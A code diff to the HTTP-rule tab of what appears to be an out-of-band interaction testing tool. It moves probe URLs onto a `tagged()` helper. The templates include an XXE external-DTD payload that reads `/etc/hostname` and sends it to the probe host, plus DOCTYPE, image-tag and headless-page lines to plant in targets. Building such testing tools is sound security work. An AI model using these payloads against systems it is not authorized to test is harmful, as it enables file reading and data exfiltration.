@@ -13,6 +13,7 @@ import { Switch } from "@/components/ui/switch";
 import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { cn } from "@/lib/utils";
+import { tagged } from "@/lib/kit";
 
 const DEFAULT: HttpRule = { mode: "default", delayMs: 0, schemes: { http: true, https: true } };
 const MODE_DEFAULTS: Record<RuleMode, Partial<HttpRule>> = {
@@ -35,12 +36,12 @@ const TARGETS: [string, string][] = [
 ];
 
 function templates(tag: string, host: string): Record<string, { label: string; contentType: string; body: string }> {
-  const back = `https://${tag}-${host}`;
+  const back = `https://${tagged(tag, host)}`;
   return {
     "xxe-dtd": {
       label: "XXE: external DTD (out-of-band read)",
       contentType: "application/xml-dtd",
-      body: `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${tag}.${host}/x?d=%file;'>">\n%eval;\n%exfil;\n`,
+      body: `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${tagged(tag, host)}/x?d=%file;'>">\n%eval;\n%exfil;\n`,
     },
     "headless-page": {
       label: "HTML: probe page for headless browsers and PDF renderers",
@@ -316,7 +317,7 @@ export function HttpRuleTab({ p }: { p: Probe }) {
             </Row>
             {draft.template && plantHint(draft.template, p.tag, host) && <Row label="Plant this">{plantHint(draft.template, p.tag, host)}</Row>}
             <Row label="Fetch URL" help="The file is served at any path under the probe, over HTTP and HTTPS.">
-              {[`http://${p.tag}.${host}/x`, `https://${p.tag}-${host}/x`].map((u) => <CopyLine key={u} text={u} what="fetch URL" />)}
+              {[`http://${tagged(p.tag, host)}/x`, `https://${tagged(p.tag, host)}/x`].map((u) => <CopyLine key={u} text={u} what="fetch URL" />)}
             </Row>
             <Row label="Content type" error={errFor("contentType")}><label className={cn(fld, bad("contentType"))}><input aria-label="Content type" spellCheck={false} value={draft.contentType ?? ""} className={inputCls} onChange={(e) => set({ contentType: e.target.value })} /></label></Row>
           </>
@@ -431,9 +432,9 @@ function CopyLine({ text, what }: { text: string; what: string }) {
 
 // what to put in the target so it fetches the hosted file
 function plantHint(template: string, tag: string, host: string) {
-  if (template === "xxe-dtd") return <CopyLine text={`<!DOCTYPE x SYSTEM "http://${tag}.${host}/x.dtd">`} what="DOCTYPE line" />;
-  if (template === "svg") return <CopyLine text={`<img src="https://${tag}-${host}/x.svg">`} what="image tag" />;
-  if (template === "headless-page") return <CopyLine text={`https://${tag}-${host}/page.html`} what="page URL" />;
+  if (template === "xxe-dtd") return <CopyLine text={`<!DOCTYPE x SYSTEM "http://${tagged(tag, host)}/x.dtd">`} what="DOCTYPE line" />;
+  if (template === "svg") return <CopyLine text={`<img src="https://${tagged(tag, host)}/x.svg">`} what="image tag" />;
+  if (template === "headless-page") return <CopyLine text={`https://${tagged(tag, host)}/page.html`} what="page URL" />;
   return null;
 }
 
